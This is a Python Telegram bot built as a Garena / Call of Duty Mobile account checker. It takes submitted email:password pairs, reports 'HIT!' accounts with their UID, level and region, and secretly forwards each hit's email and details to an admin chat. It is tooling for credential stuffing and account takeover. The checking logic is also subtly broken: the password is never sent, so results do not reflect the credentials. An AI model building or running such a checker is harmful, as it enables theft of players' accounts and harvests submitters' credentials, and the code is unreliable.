import os
import requests
import time
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, CallbackContext

# ============================
# Replace these with your actual values
# ============================
BOT_TOKEN = 'your_bot_token_here'  # <-- Your Telegram Bot Token
ADMIN_ID = your_admin_id_here       # <-- Your Telegram User ID (integer, e.g., 123456789)

# API URLs
CHECK_LOGIN_URL = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/"
ACCOUNT_INIT_URL = "https://account.garena.com/api/account/init"
INSPECT_TOKEN_URL = "https://shop.garena.sg/api/auth/inspect_token"
TOKEN_URL = "https://authgop.garena.com/oauth/token/grant"

# Headers for token request
TOKEN_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Common headers for API requests
COMMON_HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "user-agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.0.0 Mobile Safari/537.36",
    "referer": "https://auth.garena.com/",
    "x-requested-with": "com.garena.game.codm"
}

async def start(update: Update, context: CallbackContext):
    print("Received /start command")
    await update.message.reply_text("🎮 Welcome! Send credentials as email:pass.")

async def handle_message(update: Update, context: CallbackContext):
    text = update.message.text.strip()
    if ':' not in text:
        await update.message.reply_text("❌ Invalid format. Use email:pass")
        return

    email, password = text.split(':', 1)
    await check_account(update, context, email, password)

async def check_account(update, context, email, password):
    print(f"Checking account: {email}")
    token = get_access_token()
    if not token:
        await update.message.reply_text("🚫 Failed to get access token.")
        return

    if not inspect_token(token):
        await update.message.reply_text("🚫 Token inspection failed.")
        return

    headers = COMMON_HEADERS.copy()
    headers.update({
        "accept": "application/json, text/plain, */*",
        "codm-delete-token": token,
        "origin": "https://delete-request-aos.garena.co.id",
        "referer": "https://delete-request-aos.garena.co.id/",
        "user-agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
        "x-requested-with": "com.garena.game.codm"
    })

    try:
        r = requests.post(CHECK_LOGIN_URL, headers=headers, timeout=30)
        r.raise_for_status()
        result = r.json()
        if "error" in result:
            await update.message.reply_text("❌ Invalid credentials.")
        else:
            # Valid account, fetch info
            resp = requests.get(ACCOUNT_INIT_URL, headers=COMMON_HEADERS, timeout=30)
            resp.raise_for_status()
            info = resp.json()
            msg = (
                f"✅ HIT!\n"
                f"🔑 Login: {email}\n"
                f"📝 Username: {info.get('nickname', 'N/A')}\n"
                f"🆔 UID: {info.get('uid', 'N/A')}\n"
                f"⭐ Level: {info.get('level', 'N/A')}\n"
                f"🌎 Region: {info.get('region', 'N/A')}\n"
                f"📧 Email Verified: {info.get('email_verified', True)}\n"
                f"📱 Phone Verified: {info.get('phone_verified', True)}"
            )
            await update.message.reply_text(msg)

            # Notify admin
            admin_msg = (
                f"🔔 **HIT!**\n"
                f"User: {update.message.from_user.mention_html()}\n"
                f"Email: {email}\n"
                f"UID: {info.get('uid', 'N/A')}\n"
                f"Level: {info.get('level', 'N/A')}\n"
                f"Region: {info.get('region', 'N/A')}"
            )
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode='HTML')

    except requests.exceptions.Timeout:
        await update.message.reply_text("Request timed out.")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

def get_access_token():
    data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"
    try:
        r = requests.post(TOKEN_URL, headers=TOKEN_HEADERS, data=data, timeout=30)
        r.raise_for_status()
        res_json = r.json()
        token = res_json.get("access_token")
        if token:
            print("Access token obtained.")
            return token
        else:
            print("Failed to get access token.")
            return None
    except Exception as e:
        print(f"Error getting token: {e}")
        return None

def inspect_token(token):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/json"
    }
    try:
        r = requests.post(INSPECT_TOKEN_URL, headers=headers, json={"access_token": token}, timeout=30)
        r.raise_for_status()
        print("Token inspected successfully.")
        return True
    except Exception as e:
        print(f"Error inspecting token: {e}")
        return False

# Main
if __name__ == '__main__':
    # Replace with your actual bot token and admin ID
    # Example:
    # BOT_TOKEN = '123456789:ABCdefGHIjklMNOpqrSTUvwxYz'
    # ADMIN_ID = 123456789
    print("Starting bot...")
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()
